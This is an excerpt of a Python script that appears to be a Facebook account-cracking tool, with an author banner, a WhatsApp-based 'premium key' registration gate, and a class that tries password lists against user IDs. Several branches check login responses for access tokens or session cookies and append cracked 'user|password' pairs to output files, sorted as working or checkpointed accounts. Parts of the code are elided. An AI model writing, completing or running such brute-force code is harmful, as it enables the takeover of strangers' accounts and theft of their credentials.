...
def logo():
	print("""%s
           ...
           \033[1;33m ##        #######     ##     ######  ##     ## ######## 
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : FOYSAL HASAN        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : FOYSAL HASAN        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : FOYSAL HASAN        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801854521971     \033[1;93m▇▇
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/FOYSAL-100/DNC-OK/tree/main').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20FOYSAL-VAI,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+8801854521971?text=' + tks)
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : FOYSAL-KHAN");time.sleep (0.03)
    print("             [*]. FACEBOOK   :  NOOB-USE KORI NAA");time.sleep (0.03)
    print("             [*]. GITHUB     : FUCK-KING");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [FOYSAL] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-FOYSAL] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('FOYSAL-ok.txt' , 'a').write('%s\n' % wrt)
                break
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-FOYSAL] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KHAN-cp.txt' , 'a').write('%s\n' % wrt)
                        break
